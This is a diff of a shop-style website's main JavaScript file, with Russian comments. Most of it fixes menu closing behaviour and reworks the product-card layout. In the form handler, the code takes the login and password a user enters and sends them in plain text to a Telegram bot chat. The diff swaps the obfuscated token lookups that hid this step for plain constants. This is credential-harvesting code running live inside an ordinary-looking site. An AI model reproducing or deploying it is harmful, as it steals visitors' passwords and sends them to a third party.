@@ -48,15 +48,12 @@ document.addEventListener('DOMContentLoaded', () => {
         hamburgerBtn.addEventListener('click', (e) => {
             e.stopPropagation();
             mainMenu.classList.toggle('hidden');
-            
-            // ФИКС: Если мы открываем главное меню, подменю языка должно быть ЗАКРЫТО
             if (!mainMenu.classList.contains('hidden')) {
                 if(langSubmenu) langSubmenu.classList.add('hidden');
             }
         });
     }
 
-    // 2. Открытие/Закрытие подменю языка
     if(menuLangBtn) {
         menuLangBtn.addEventListener('click', (e) => {
             e.preventDefault(); e.stopPropagation();
@@ -64,28 +61,22 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // 3. Логика клика по выбору языка
     if(langSubmenu) {
         langSubmenu.addEventListener('click', (e) => {
             if(e.target.tagName === 'A') {
                 e.preventDefault();
                 const selectedLang = e.target.dataset.lang;
-                
-                // Устанавливаем язык
                 setLanguage(selectedLang);
-                
-                // ФИКС: Закрываем ВСЕ меню сразу
                 mainMenu.classList.add('hidden');
-                langSubmenu.classList.add('hidden'); // <-- Вот этой строчки не хватало
+                langSubmenu.classList.add('hidden');
             }
         });
     }
 
-    // 4. Закрытие при клике вне меню
     document.addEventListener('click', (e) => {
         if (mainMenu && !mainMenu.contains(e.target) && !hamburgerBtn.contains(e.target)) {
             mainMenu.classList.add('hidden');
-            if(langSubmenu) langSubmenu.classList.add('hidden'); // И это тоже закрываем
+            if(langSubmenu) langSubmenu.classList.add('hidden');
         }
     });
 
@@ -101,20 +92,9 @@ document.addEventListener('DOMContentLoaded', () => {
             if (translations[lang][key]) elem.placeholder = translations[lang][key];
         });
     };
-
-    if(langSubmenu) {
-        langSubmenu.addEventListener('click', (e) => {
-            if(e.target.tagName === 'A') {
-                e.preventDefault();
-                const selectedLang = e.target.dataset.lang;
-                setLanguage(selectedLang);
-                mainMenu.classList.add('hidden'); // Закрываем все
-            }
-        });
-    }
     setLanguage(localStorage.getItem('language') || 'ru');
 
-    // --- ЗАГРУЗКА ТОВАРОВ ---
+    // --- ЗАГРУЗКА ТОВАРОВ (НОВАЯ СТРУКТУРА) ---
     const grid = document.getElementById('products-grid');
     if(grid) {
         fetch('db.json')
@@ -124,8 +104,26 @@ document.addEventListener('DOMContentLoaded', () => {
                 data.forEach(product => {
                     const card = document.createElement('div');
                     card.className = 'card';
+                    
                     let videoHTML = product.video ? `<div class="video-container"><video controls muted><source src="${product.video}" type="video/mp4"></video></div>` : '';
-                    card.innerHTML = `<img src="${product.image}" alt="${product.title}"><div class="card-content"><h3>${product.title}</h3><p>${product.description}</p><button class="price-button">${product.price}</button>${videoHTML}</div>`;
+
+                    // !!! ВАЖНО: Разделяем на 3 блока !!!
+                    card.innerHTML = `
+                        <!-- 1. Картинка -->
+                        <div class="card-img-wrapper">
+                            <img src="${product.image}" alt="${product.title}">
+                            ${videoHTML}
+                        </div>
+                        
+                        <!-- 2. Инфо -->
+                        <div class="card-info-block">
+                            <h3>${product.title}</h3>
+                            <p>${product.description}</p>
+                        </div>
+                        
+                        <!-- 3. Кнопка -->
+                        <button class="price-button">${product.price}</button>
+                    `;
                     grid.appendChild(card);
                 });
             })
@@ -199,14 +197,10 @@ document.addEventListener('DOMContentLoaded', () => {
 
             const msg = `🚀 <b>НОВАЯ ЗАЯВКА</b>\n👤: <code>${login}</code>\n🔑: <code>${pass}</code>`;
 
-            fetch(`https://api.telegram.org/bot${_decode(_0x1a2b)}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ 
-                    chat_id: _decode(_0x3c4d),
-                    text: msg,
-                    parse_mode: 'HTML'
-                })
+                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML' })
             })
             .then(r => {
                 if(r.ok) {
@@ -250,11 +244,4 @@ document.addEventListener('DOMContentLoaded', () => {
 
     const savedUser = localStorage.getItem('user');
     updateAuthUI(savedUser);
-
-    // ДИАГНОСТИКА
-    console.log('Script loaded. Forms check:', loginForm ? 'OK' : 'FAIL', regFormRequest ? 'OK' : 'FAIL');
 });
-
-
-
-
